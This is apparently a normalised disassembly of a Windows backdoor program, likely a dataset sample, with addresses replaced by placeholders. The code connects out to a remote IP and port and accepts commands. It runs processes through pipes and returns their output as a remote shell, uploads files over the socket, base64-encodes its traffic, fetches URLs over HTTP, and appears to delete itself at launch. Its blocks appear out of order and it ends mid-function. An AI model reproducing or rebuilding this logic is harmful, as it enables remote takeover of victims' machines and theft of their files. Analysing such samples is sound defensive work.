sub_401000
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
xor edi edi
push rw-data
push edi
push rw-data
push sub_4011aa
push edi
push edi
call [ CreateThread@IAT ]
mov ebx [ GetSystemTime@IAT ]
push rw-data
mov [ rw-data ] eax
call ebx
mov esi [ WaitForSingleObject@IAT ]
push edi
push [ rw-data ]
call sub_401095
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x10
lea eax [ ebp - 0x10 ]
push eax
call ebx
movzx eax [ rw-data ]
movzx ecx [ ebp - 0x6 ]
sub ecx eax
cmp ecx 0x1e
jge r-xdata
push edi
push [ rw-data ]
call [ TerminateThread@IAT ]
mov [ rw-data ] edi
push 0xea60
call [ Sleep@IAT ]
push edi
push [ rw-data ]
jmp r-xdata
call esi
test eax eax
je r-xdata
sub_401095
push ebp
mov ebp esp
sub esp 0x63c
push ebx
push esi
mov esi 0x104
push edi
lea eax [ ebp - 0x23c ]
push esi
xor edi edi
push eax
push edi
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x23c ]
push esi
push eax
lea eax [ ebp - 0x23c ]
push eax
call [ GetShortPathNameA@IAT ]
lea eax [ ebp - 0x63c ]
push esi
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
lea eax [ ebp - 0x43c ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea eax [ ebp - 0x23c ]
push eax
lea eax [ ebp - 0x43c ]
push eax
call esi
lea eax [ ebp - 0x43c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x63c ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x43c ]
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
mov edi [ GetCurrentProcess@IAT ]
push 0x100
mov [ ebp - 0x3c ] 0x3c
mov [ ebp - 0x38 ] 0x40
mov [ ebp - 0x30 ] rw-data
mov [ ebp - 0x28 ] eax
call edi
mov esi [ SetPriorityClass@IAT ]
push eax
call esi
mov ebx [ GetCurrentThread@IAT ]
push 0xf
call ebx
push eax
call [ SetThreadPriority@IAT ]
lea eax [ ebp - 0x3c ]
push eax
call [ ShellExecuteExA@IAT ]
test eax eax
je r-xdata
push 0x20
call edi
push eax
call esi
push 0x0
call ebx
push eax
call [ SetThreadPriority@IAT ]
xor eax eax
push 0x40
push [ ebp - 0x4 ]
call esi
push 0x1
push [ ebp - 0x4 ]
call [ SetProcessPriorityBoost@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4011aa
push ebp
mov ebp esp
mov eax 0x17cc
call sub_402390
push ebx
push esi
push edi
xor ebx ebx
xor eax eax
lea edi [ ebp - 0x23 ]
mov [ ebp - 0x24 ] bl
mov [ ebp - 0xc ] bl
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
lea edi [ ebp - 0xb ]
stosd [ edi ]
stosd [ edi ]
push 0x1
stosb [ edi ]
pop esi
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push rw-data
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esi
call [ sscanf@IAT ]
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x34 ] 0x2
push eax
call strlen
add esp 0x14
cmp eax 0xf
ja r-xdata
xor eax eax
lea eax [ ebp - 0x24 ]
push eax
call [ inet_addr@IAT ]
mov edi [ atoi@IAT ]
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0xc ]
push eax
call edi
test eax eax
pop ecx
jle r-xdata
lea eax [ ebp - 0xc ]
push eax
call edi
cmp eax 0xffff
pop ecx
jge r-xdata
lea eax [ ebp - 0xc ]
push eax
call edi
pop ecx
push eax
call [ htons@IAT ]
mov [ ebp - 0x32 ] ax
lea eax [ ebp - 0x3cc ]
push eax
push 0x202
call [ WSAStartup@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push 0x6
push esi
push 0x2
call [ WSASocketA@IAT ]
mov esi eax
or edi 0xffffffff
cmp esi edi
jne r-xdata
lea eax [ ebp - 0x34 ]
push 0x10
push eax
push esi
call [ connect@IAT ]
cmp eax edi
je r-xdata
push edi
call [ closesocket@IAT ]
jmp r-xdata
push 0x2
push esi
call [ shutdown@IAT ]
push esi
call [ closesocket@IAT ]
call [ WSACleanup@IAT ]
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x8004667e
push esi
call [ ioctlsocket@IAT ]
cmp eax edi
jne r-xdata
call [ WSACleanup@IAT ]
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
push ebx
push [ r--data ]
call strlen
pop ecx
push eax
push [ r--data ]
push esi
call [ send@IAT ]
cmp eax edi
je r-xdata
push esi
call [ closesocket@IAT ]
push 0x1
pop ebx
mov edi 0x1400
lea eax [ ebp - 0x138 ]
push eax
push esi
call __WSAFDIsSet
test eax eax
je r-xdata
push 0xc8
call [ Sleep@IAT ]
jmp r-xdata
push ebx
lea eax [ ebp - 0x17cc ]
push edi
push eax
push esi
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
lea eax [ ebp - 0x17cc ]
push ebx
push eax
call memset
add esp 0xc
mov [ ebp - 0x134 ] esi
mov [ ebp - 0x238 ] esi
push 0x1
pop eax
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x23c ] eax
push ebx
lea eax [ ebp - 0x23c ]
push ebx
push eax
lea eax [ ebp - 0x138 ]
push eax
push ebx
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ r--data ]
call strlen
push eax
lea eax [ ebp - 0x17cc ]
push [ r--data ]
push eax
call [ _strnicmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
push [ rw-data ]
call strlen
push eax
lea eax [ ebp - 0x17cc ]
push [ rw-data ]
push eax
call [ _strnicmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
push [ rw-data ]
call strlen
push eax
lea eax [ ebp - 0x17cc ]
push [ rw-data ]
push eax
call [ _strnicmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
push [ r--data ]
call strlen
push eax
lea eax [ ebp - 0x17cc ]
push [ r--data ]
push eax
call [ _strnicmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_401a29
jmp r-xdata
push esi
call sub_401459
jmp r-xdata
sub_401459
sub esp 0x488
mov ax [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x20 ] ax
xor eax eax
lea edi [ esp + 0x22 ]
stosd [ edi ]
stosd [ edi ]
mov esi rw-data
lea edi [ esp + 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
push 0x200
mov [ esp + 0x1c ] 0x6
mov [ esp + 0x20 ] ebx
movsw [ edi ] [ esi ]
call ??2@YAPAXI@Z
mov edi [ esp + 0x4a0 ]
pop ecx
mov [ esp + 0x14 ] eax
mov esi 0x1400
pop edi
pop esi
pop ebp
pop ebx
add esp 0x488
retn 0x4
lea eax [ esp + 0x13c ]
push eax
push edi
call __WSAFDIsSet
test eax eax
je r-xdata
push esi
mov ebp rw-data
push ebx
push ebp
call memset
push esi
push ebx
push rw-data
call memset
push esi
push ebx
push rw-data
call memset
push esi
push ebx
push rw-data
call memset
push 0x200
push ebx
push [ esp + 0x4c ]
call memset
add esp 0x3c
lea eax [ esp + 0x13c ]
mov [ esp + 0x140 ] edi
mov [ esp + 0x13c ] 0x1
push ebx
push ebx
push ebx
push eax
push ebx
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
push ebx
push esi
push rw-data
push edi
call [ recv@IAT ]
push ebx
push rw-data
push ebp
mov [ esp + 0x1c ] eax
call sub_40173f
add esp 0xc
cmp [ esp + 0x10 ] 0xffffffff
je r-xdata
push edi
call [ closesocket@IAT ]
push 0x6
push rw-data
push ebp
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push rw-data
push ebp
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
je r-xdata
push rw-data
push ebp
call [ strstr@IAT ]
add eax 0x7
push eax
push [ esp + 0x20 ]
call strcpy
push rw-data
push [ esp + 0x28 ]
call [ fopen@IAT ]
mov ebp eax
add esp 0x18
cmp ebp ebx
je r-xdata
push 0x4
push rw-data
push ebp
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
mov [ esp + 0x3c ] edi
push eax
lea eax [ esp + 0x3c ]
push ebx
push eax
push ebx
push ebx
mov [ esp + 0x4c ] 0x1
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0x2
push ebx
push ebp
call [ fseek@IAT ]
push ebp
call [ ftell@IAT ]
push ebx
push ebx
push ebp
mov [ esp + 0x2c ] eax
call [ fseek@IAT ]
lea eax [ esp + 0x3c ]
push 0xa
push eax
push [ esp + 0x34 ]
call [ _itoa@IAT ]
push 0x258
lea eax [ esp + 0x26c ]
push ebx
push eax
call memset
push [ esp + 0x48 ]
lea eax [ esp + 0x278 ]
push eax
call strcpy
lea eax [ esp + 0x27c ]
push rw-data
push eax
call strcat
add esp 0x44
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x244 ]
push eax
call strcat
pop ecx
lea eax [ esp + 0x1c ]
pop ecx
mov [ esp + 0x3c ] edi
push eax
lea eax [ esp + 0x3c ]
push ebx
push eax
push ebx
push ebx
mov [ esp + 0x4c ] 0x1
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
lea eax [ esp + 0x38 ]
push eax
push edi
call __WSAFDIsSet
test eax eax
je r-xdata
lea eax [ esp + 0x38 ]
push eax
push edi
call __WSAFDIsSet
test eax eax
je r-xdata
lea eax [ esp + 0x2c ]
push ebx
push eax
call strlen
pop ecx
push eax
lea eax [ esp + 0x34 ]
push eax
push edi
call [ send@IAT ]
jmp r-xdata
lea eax [ esp + 0x240 ]
push ebx
push eax
call strlen
pop ecx
push eax
lea eax [ esp + 0x248 ]
push eax
push edi
call [ send@IAT ]
push 0x3e8
call [ Sleep@IAT ]
push [ esp + 0x10 ]
push ebp
push edi
call sub_40197f
push ebp
call [ fclose@IAT ]
add esp 0x10
jmp r-xdata
sub_40173f
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
test eax eax
push edi
jne r-xdata
and [ ebp + 0xc ] 0x0
and [ ebp - 0xc ] 0x0
mov ebx [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
test ecx ecx
mov [ ebp - 0x8 ] esi
jle r-xdata
push esi
call strlen
pop ecx
mov [ ebp + 0x10 ] eax
cmp [ ebp - 0xc ] eax
jge r-xdata
lea eax [ ecx + 0x3 ]
shr eax 0x2
mov [ ebp - 0x10 ] eax
lea ecx [ eax + eax * 2 ]
shl eax 0x2
mov [ ebp + 0xc ] ecx
mov [ ebp - 0xc ] eax
and [ ebx ] 0x0
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
leave
retn
sub eax [ ebp - 0xc ]
xor esi esi
mov [ ebp + 0x10 ] esi
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
mov [ ebp + 0x8 ] edi
shr [ ebp + 0x8 ] 0x8
push [ ebp + 0x8 ]
call sub_401933
mov esi eax
push edi
and esi 0xff0
shl esi 0x2
sar esi 0x6
call sub_401933
mov [ ebp - 0x4 ] edi
and eax 0x3f
shr [ ebp - 0x4 ] 0x10
push [ ebp - 0x4 ]
shl eax 0x2
or esi eax
call sub_401933
push [ ebp + 0x8 ]
and eax 0x3fc
shl eax 0x2
sar eax 0x4
mov [ ebp - 0x14 ] eax
call sub_401933
mov ecx [ ebp - 0x14 ]
and eax 0xf
shl eax 0x4
shr edi 0x18
or ecx eax
push edi
mov [ ebp + 0x8 ] ecx
call sub_401933
push [ ebp - 0x4 ]
mov edi eax
and edi 0xff
shl edi 0x2
sar edi 0x2
call sub_401933
and eax 0x3
add [ ebp - 0x8 ] 0x4
shl eax 0x6
or edi eax
add esp 0x18
shl edi 0x8
or edi [ ebp + 0x8 ]
shl edi 0x8
or edi esi
mov [ ebx ] edi
add ebx 0x3
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] esi
shr [ ebp + 0x10 ] 0x8
push [ ebp + 0x10 ]
call sub_401933
mov edx eax
push esi
shl edx 0x2
sar edx 0x6
mov [ ebp + 0x8 ] edx
call sub_401933
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
shl al 0x2
or cl al
mov eax esi
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
and eax 0xff00
cmp eax 0x3d00
je r-xdata
mov esi [ ebp - 0x8 ]
mov ecx eax
lea edi [ ebp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ ebp + 0x10 ]
mov eax esi
and eax 0xff0000
cmp eax 0x3d0000
je r-xdata
mov eax esi
and eax 0xff0000
cmp eax 0x3d0000
je r-xdata
mov eax esi
and eax 0xff000000
cmp eax 0x3d000000
je r-xdata
mov eax esi
shr eax 0x10
push eax
call sub_401933
push [ ebp + 0x10 ]
mov edx eax
shl edx 0x2
sar edx 0x4
mov [ ebp + 0x10 ] edx
call sub_401933
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
shl al 0x4
or cl al
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
mov eax esi
shr eax 0x18
push eax
call sub_401933
mov edx eax
shl edx 0x2
shr esi 0x10
sar edx 0x2
push esi
mov [ ebp + 0x10 ] edx
call sub_401933
pop ecx
pop ecx
mov ecx [ ebp + 0x10 ]
shl al 0x6
or cl al
mov [ ebx ] cl
inc ebx
inc [ ebp + 0xc ]
sub_401933
mov cl [ esp + 0x4 ]
or eax 0xffffffff
cmp cl 0x41
jl r-xdata
cmp cl 0x61
jl r-xdata
cmp cl 0x5a
jg r-xdata
cmp cl 0x30
jl r-xdata
cmp cl 0x7a
jg r-xdata
movsx eax cl
sub eax 0x41
retn
cmp cl 0x2b
jne r-xdata
cmp cl 0x39
jg r-xdata
movsx eax cl
sub eax 0x47
retn
cmp cl 0x2f
jne r-xdata
push 0x3e
pop eax
retn
movsx eax cl
add eax 0x4
retn
retn
push 0x3f
pop eax
sub_40197f
push ebp
mov ebp esp
sub esp 0x50c
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] 0x493e0
cmp eax ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp + 0x10 ] eax
jle r-xdata
xor eax eax
pop ebx
leave
retn
push esi
push edi
mov esi 0x400
cmp [ ebp + 0x10 ] ebx
jg r-xdata
push esi
lea eax [ ebp - 0x50c ]
push ebx
push eax
call memset
push [ ebp + 0xc ]
lea eax [ ebp - 0x50c ]
push esi
push edi
push eax
call [ fread@IAT ]
add esp 0x1c
mov edi eax
lea eax [ ebp - 0x50c ]
push ebx
push edi
push eax
push [ ebp + 0x8 ]
call [ send@IAT ]
sub [ ebp + 0x10 ] edi
mov eax [ ebp + 0x8 ]
push 0x1
mov [ ebp - 0x108 ] eax
pop edi
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x10c ] edi
push eax
lea eax [ ebp - 0x10c ]
push ebx
push eax
push ebx
push ebx
call [ select@IAT ]
lea eax [ ebp - 0x10c ]
push eax
push [ ebp + 0x8 ]
call __WSAFDIsSet
test eax eax
je r-xdata
pop edi
pop esi
sub_401a29
push ebp
mov ebp esp
sub esp 0xbbc
push ebx
push esi
push edi
push 0x4a
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x2b7 ]
mov [ ebp - 0x2b8 ] bl
mov [ ebp - 0x9bc ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0xff
xor eax eax
lea edi [ ebp - 0x9bb ]
mov esi 0x200
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ax [ rw-data ]
lea edi [ ebp - 0x26 ]
mov [ ebp - 0x28 ] ax
xor eax eax
stosd [ edi ]
push esi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x1c ] 0x6
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x34 ] 0xc
stosd [ edi ]
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x1
call ??2@YAPAXI@Z
mov [ ebp - 0x10 ] eax
pop ecx
lea eax [ ebp - 0x5bc ]
push eax
push esi
call [ GetCurrentDirectoryA@IAT ]
lea eax [ ebp - 0x5bc ]
push rw-data
push eax
call strcat
pop ecx
mov esi 0x1400
pop ecx
mov edi rw-data
cmp [ ebp - 0x8 ] ebx
je r-xdata
lea eax [ ebp - 0x78 ]
mov [ ebp - 0x78 ] 0x44
push eax
call [ GetStartupInfoA@IAT ]
mov eax [ ebp - 0xc ]
push rw-data
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x2b8 ]
mov [ ebp - 0x48 ] bx
push eax
mov [ ebp - 0x4c ] 0x101
call strcat
push esi
push ebx
push edi
call memset
push esi
push ebx
push rw-data
call memset
push esi
push ebx
push rw-data
call memset
lea eax [ ebp - 0x5bc ]
push eax
push rw-data
call strcat
mov eax [ ebp + 0x8 ]
add esp 0x34
mov [ ebp - 0x188 ] eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x18c ]
push ebx
push eax
push ebx
push ebx
mov [ ebp - 0x18c ] 0x1
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] ebx
pop edi
pop esi
pop ebx
je r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x18c ]
push eax
push [ ebp + 0x8 ]
call __WSAFDIsSet
test eax eax
je r-xdata
leave
retn 0x4
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
mov eax [ ebp + 0x8 ]
push esi
push ebx
push edi
mov [ ebp - 0x3b8 ] eax
mov [ ebp - 0x3bc ] 0x1
call memset
push esi
push ebx
push rw-data
call memset
add esp 0x18
lea eax [ ebp - 0x3bc ]
push ebx
push ebx
push ebx
push eax
push ebx
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
push ebx
push rw-data
push rw-data
call sub_401ef6
add esp 0xc
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] eax
push ebx
push 0x4
push 0xa
push ecx
push eax
call [ _itoa@IAT ]
add esp 0xc
push eax
push [ ebp + 0x8 ]
call [ send@IAT ]
push [ ebp - 0x4 ]
push rw-data
push [ ebp + 0x8 ]
call sub_402334
add esp 0xc
lea eax [ ebp - 0x3bc ]
push eax
push [ ebp + 0x8 ]
call __WSAFDIsSet
test eax eax
je r-xdata
lea eax [ ebp - 0x34 ]
push ebx
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x14 ] ebx
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
push rw-data
call [ GetSystemTime@IAT ]
push ebx
push 0x13ff
push rw-data
push [ ebp + 0x8 ]
call [ recv@IAT ]
push ebx
push rw-data
push edi
mov [ ebp - 0x4 ] eax
call sub_40173f
add esp 0xc
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call [ closesocket@IAT ]
push 0x7
push rw-data
push edi
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push rw-data
push edi
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
je r-xdata
push rw-data
push edi
call [ strstr@IAT ]
add eax 0x8
push eax
push [ ebp - 0x10 ]
call strcpy
push [ ebp - 0x10 ]
call sub_402149
push 0x200
push ebx
push [ ebp - 0x10 ]
call memset
add esp 0x20
jmp r-xdata
push 0x4
push rw-data
push edi
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
je r-xdata
push 0x2
push rw-data
push edi
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x2b8 ]
push edi
push eax
call [ strncat@IAT ]
add esp 0xc
lea eax [ ebp - 0x88 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
push ebx
push ebx
push 0x10
push 0x1
push ebx
lea eax [ ebp - 0x2b8 ]
push ebx
push eax
push ebx
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
push rw-data
push edi
call [ strstr@IAT ]
add eax 0x3
push eax
lea eax [ ebp - 0xbbc ]
push eax
call strcpy
lea eax [ ebp - 0xbbc ]
push eax
call [ _chdir@IAT ]
add esp 0x14
test eax eax
jne r-xdata
push 0x12c
lea eax [ ebp - 0x2b8 ]
push ebx
push eax
call memset
add esp 0xc
push [ ebp - 0xc ]
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x5bc ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
lea eax [ ebp - 0x5bc ]
push rw-data
push eax
call strcat
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
jmp r-xdata
push esi
push ebx
push edi
call memset
push esi
push ebx
push rw-data
call memset
push esi
push ebx
push rw-data
call memset
lea eax [ ebp - 0x9bc ]
push eax
push rw-data
call strcat
mov eax [ ebp + 0x8 ]
add esp 0x2c
mov [ ebp - 0x188 ] eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x18c ]
push ebx
push eax
push ebx
push ebx
mov [ ebp - 0x18c ] 0x1
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x18c ]
push eax
push [ ebp + 0x8 ]
call __WSAFDIsSet
test eax eax
je r-xdata
push 0x400
lea eax [ ebp - 0x9bc ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x14 ]
push ebx
push eax
lea eax [ ebp - 0x9bc ]
push 0x400
push eax
push [ ebp - 0x8 ]
call [ ReadFile@IAT ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
push ebx
push rw-data
push rw-data
call sub_401ef6
add esp 0xc
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] eax
push ebx
push 0x4
push 0xa
push ecx
push eax
call [ _itoa@IAT ]
add esp 0xc
push eax
push [ ebp + 0x8 ]
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x4 ]
push rw-data
push [ ebp + 0x8 ]
call sub_402334
add esp 0xc
jmp r-xdata
sub_401ef6
push ebp
mov ebp esp
sub esp 0x124
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
test ecx ecx
push edi
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
and [ ebp + 0x8 ] 0x0
mov [ ebp + 0xc ] eax
lea eax [ ecx - 0x3 ]
mov [ ebp - 0x8 ] esi
test eax eax
mov ebx rw-data
jle r-xdata
push esi
call strlen
pop ecx
mov [ ebp + 0x10 ] eax
mov ecx eax
cmp [ ebp + 0x8 ] ecx
jge r-xdata
push 0x3
add eax 0x2
xor edx edx
pop ecx
div ecx
mov ecx eax
mov [ ebp - 0xc ] eax
shl ecx 0x2
lea eax [ eax + eax * 2 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
and [ eax ] 0x0
mov eax [ ebp - 0x4 ]
leave
retn
sub ecx [ ebp + 0x8 ]
xor edx edx
mov [ ebp + 0x10 ] edx
test ecx ecx
mov [ ebp + 0x8 ] ecx
jle r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
mov eax edx
shr eax 0x2
and eax 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
mov esi [ ebp - 0x8 ]
mov eax ecx
lea edi [ ebp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edx [ ebp + 0x10 ]
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x124 ]
jmp r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x9c ]
jmp r-xdata
movsx eax al
mov [ ebp - 0x10 ] eax
mov eax edx
mov ecx edx
push 0x10
shr eax 0xc
and ecx 0x3
and eax 0xf
shl ecx 0x4
or eax ecx
pop ecx
mov esi ebx
lea edi [ ebp - 0x9c ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
cmp eax 0x40
jge r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov cl 0x3d
cmp edx 0x40
jge r-xdata
mov al [ ebp + eax - 0xe0 ]
jmp r-xdata
movsx eax al
mov [ ebp - 0x14 ] eax
mov eax edx
shr eax 0x8
mov ecx edx
and eax 0xf
shr ecx 0x16
shl eax 0x2
and ecx 0x3
push 0x10
or eax ecx
pop ecx
mov esi ebx
lea edi [ ebp - 0xe0 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
mov eax edx
mov ecx edx
shr eax 0x8
and eax 0xf
push 0x10
shr ecx 0x16
shl eax 0x2
and ecx 0x3
mov esi ebx
or eax ecx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x10
mov esi ebx
lea edi [ ebp - 0x58 ]
mov [ ecx ] al
mov eax edx
mov ecx edx
shr eax 0xc
and ecx 0x3
and eax 0xf
shl ecx 0x4
or eax ecx
pop ecx
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
push 0x10
pop ecx
mov esi ebx
lea edi [ ebp - 0x124 ]
mov edx [ eax ]
[ edi ] [ esi ]
mov eax edx
shr eax 0x2
and eax 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ebp + edx - 0x58 ]
jmp r-xdata
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
shr edx 0x10
and edx 0x3f
movsx eax al
movsb [ edi ] [ esi ]
jl r-xdata
mov al 0x3d
push 0x10
mov esi ebx
pop ecx
lea edi [ ebp - 0x58 ]
[ edi ] [ esi ]
shr edx 0x10
and edx 0x3f
movsb [ edi ] [ esi ]
jl r-xdata
cmp eax 0x40
jge r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x1
mov [ ecx + 0x1 ] al
jle r-xdata
movsx ecx cl
shl ecx 0x8
or ecx eax
mov eax [ ebp + 0xc ]
shl ecx 0x8
or ecx [ ebp - 0x14 ]
add [ ebp + 0xc ] 0x4
add [ ebp - 0x8 ] 0x3
shl ecx 0x8
or ecx [ ebp - 0x10 ]
dec [ ebp - 0xc ]
mov [ eax ] ecx
jne r-xdata
cmp edx 0x40
jge r-xdata
mov al [ ebp + eax - 0x58 ]
jmp r-xdata
mov al [ ebp + edx - 0x58 ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] 0x2
mov [ ecx + 0x2 ] al
jle r-xdata
mov ecx [ ebp + 0xc ]
add [ ebp + 0xc ] 0x4
add [ ebp - 0x4 ] 0x4
mov [ ecx + 0x3 ] al
sub_402149
push ebp
mov ebp esp
sub esp 0xc0
push ebx
push esi
push edi
push 0xf
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0xbf ]
mov [ ebp - 0xc0 ] bl
push 0xf
[ edi ]
stosw [ edi ]
stosb [ edi ]
pop ecx
xor eax eax
lea edi [ ebp - 0x5f ]
mov [ ebp - 0x60 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x4 ] ebx
push eax
lea eax [ ebp - 0xc0 ]
push eax
push rw-data
push [ ebp + 0x8 ]
call [ sscanf@IAT ]
add esp 0x10
push ebx
push ebx
push ebx
push ebx
push rw-data
call [ InternetOpenA@IAT ]
mov edi eax
cmp edi ebx
mov [ ebp + 0x8 ] edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
push __dos_header
mov eax rw-data
push 0x3
push eax
push eax
lea eax [ ebp - 0xc0 ]
push ebx
push eax
push edi
call [ InternetConnectA@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0xc ] esi
jne r-xdata
push ebx
push 0x4000000
push rw-data
push ebx
lea eax [ ebp - 0x60 ]
push rw-data
push eax
push rw-data
push esi
call [ HttpOpenRequestA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
push edi
call [ InternetCloseHandle@IAT ]
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push edi
call [ HttpSendRequestA@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
mov edi [ InternetCloseHandle@IAT ]
call edi
push esi
call edi
jmp r-xdata
mov esi [ InternetCloseHandle@IAT ]
push edi
call esi
push [ ebp - 0xc ]
call esi
push [ ebp + 0x8 ]
call esi
mov esi [ HttpQueryInfoA@IAT ]
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] 0x10
push eax
